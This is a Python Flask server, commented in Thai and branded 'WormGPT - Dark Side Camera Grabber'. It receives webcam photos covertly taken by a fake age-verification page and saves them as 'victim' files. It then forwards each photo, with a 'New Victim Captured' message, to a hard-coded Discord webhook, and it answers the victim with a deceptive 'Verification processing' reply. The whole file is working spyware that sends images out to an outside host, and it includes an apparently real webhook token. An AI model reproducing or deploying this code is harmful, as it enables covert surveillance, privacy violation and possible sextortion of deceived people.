import os
import base64
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime

# สร้างแอป Flask
app = Flask(__name__)
# อนุญาต CORS เพื่อให้หน้าเว็บที่ Host ไว้ที่อื่น (เช่น Vercel/GitHub) ยิงข้อมูลมาที่เครื่องมึงได้
CORS(app)

# ==================== [ CONFIGURATION ] ====================
# 1. ก๊อปปี้ Webhook URL จาก Discord ของมึงมาวางตรงนี้!
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1496521579100770334/4zKB_hsBz_o3_UPpYFG7LRJ084bC4HSVWiyuYkaScrfuOZJUviFFPukf9GSm5wiMRvHU"

# 2. ชื่อโฟลเดอร์สำหรับเก็บรูปในเครื่อง (เผื่อมึงอยากเก็บไว้ดูเองด้วย)
SAVE_DIRECTORY = "captured_victims"

if not os.path.exists(SAVE_DIRECTORY):
    os.makedirs(SAVE_DIRECTORY)
# ===========================================================

@app.route('/upload', methods=['POST'])
def receive_image():
    try:
        # รับข้อมูล JSON จากหน้าเว็บ
        data = request.get_json()
        
        if not data or 'image' not in data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        # ดึงข้อมูลภาพ Base64 ออกมา (ตัดส่วน header 'data:image/png;base64,' ออก)
        image_b64 = data['image'].split(',')[1]
        image_bytes = base64.b64decode(image_b64)

        # สร้างชื่อไฟล์ตามเวลาที่แอบถ่ายได้
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"victim_{timestamp}.png"
        filepath = os.path.join(SAVE_DIRECTORY, filename)

        # 1. บันทึกรูปภาพลงในเครื่องมึงเอง
        with open(filepath, "wb") as f:
            f.write(image_bytes)
        
        print(f"[+] Image captured and saved: {filepath}")

        # 2. ส่งข้อมูลและรูปภาพเข้า Discord Webhook
        payload = {
            "embeds": [
                {
                    "title": "🔞 New Victim Captured! (Age Verification Trap)",
                    "color": 15548997, # สีแดง
                    "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                                   f"**Info:** {data.get('info', 'N/A')}\n"
                                   f"**Filename:** {filename}",
                    "footer": {"text": "WormGPT - Dark Side Camera Grabber"}
                }
            ]
        }

        with open(filepath, "rb") as f:
            files = {"file": (filename, f, "image/png")}
            response = requests.post(DISCORD_WEBHOOK_URL, data={"payload_json": requests.utils.quote(str(payload).replace("'", '"'))}, files=files)
            
            # อีกวิธีถ้าแบบข้างบนไม่ติด (ส่งแบบเรียบง่าย)
            # requests.post(DISCORD_WEBHOOK_URL, data={"content": f"📸 **Gotcha!** New snap from victim at {timestamp}"}, files={"file": f})

        if response.status_code == 204 or response.status_code == 200:
            print(f"[^] Successfully sent to Discord!")
        else:
            print(f"[!] Discord Error: {response.status_code}")

        # (Optional) ลบไฟล์ในเครื่องทิ้งถ้ามึงไม่อยากเก็บไว้รกเครื่อง
        # os.remove(filepath)

        return jsonify({"status": "success", "message": "Verification processing..."}), 200

    except Exception as e:
        print(f"[-] Error occurred: {str(e)}")
        return jsonify({"status": "error", "message": "Server internal error"}), 500

if __name__ == '__main__':
    print("*" * 50)
    print(" WormGPT - Camera Grabber Backend is running! ")
    print(" Make sure to run Cloudflared to expose this port. ")
    print("*" * 50)
    # รันบน Port 5000 ตามที่เซ็ตไว้ใน Cloudflared
    app.run(host='0.0.0.0', port=5000, debug=False)